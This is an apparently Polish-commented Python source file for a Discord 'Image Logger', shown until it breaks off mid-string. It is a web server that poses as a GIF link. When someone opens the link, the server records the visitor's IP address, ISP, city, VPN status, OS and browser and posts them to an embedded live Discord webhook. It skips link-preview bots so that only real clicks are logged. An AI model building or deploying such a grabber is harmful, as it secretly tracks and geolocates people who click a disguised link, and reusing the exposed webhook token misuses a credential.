from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser

# ================== KONFIGURACJA ==================
config = {
    "webhook": "https://ptb.discord.com/api/webhooks/1491116928553451642/iKEl3y6v1aKO6HyKhY8WMIgI5puHGxpsXs11qFORrKSmQ8bUmBU2YivZE8dqAAX8fgnf
",  # ← zostawiam Twój, możesz zmienić
    "image": "https://cdn.discordapp.com/attachments/919335494473621564/1310992764200292352/attachment-8.gif?ex=69d67628&is=69d524a8&hm=073f688257636f8764e4d97b32d86b1f7e47157fe9cccc892a8168b906b1c443&",  # Twój mem GIF
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,      # ładny loading na Discordzie
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://google.com"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{"title": "Image Logger - Error", "color": config["color"], "description": f"```\n{error}\n```"}]
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=None):
    if not ip or ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{"title": "Image Logger - Link Sent", "color": config["color"], 
                           "description": f"**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`"}]
            })
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        info = {}

    ping = "@everyone"
    if info.get("proxy") and config["vpnCheck"] == 2:
        return
    if info.get("proxy") and config["vpnCheck"] == 1:
        ping = ""

    if info.get("hosting") and config["antiBot"] in [3, 4]:
        return
    if info.get("hosting") and config["antiBot"] == 2 and not info.get("proxy"):
        ping = ""

    os, browser = httpagentparser.simple_detect(useragent or "")

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **VPN:** `{info.get('proxy', False)}`
> **Hosting:** `{info.get('hosting', False)}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
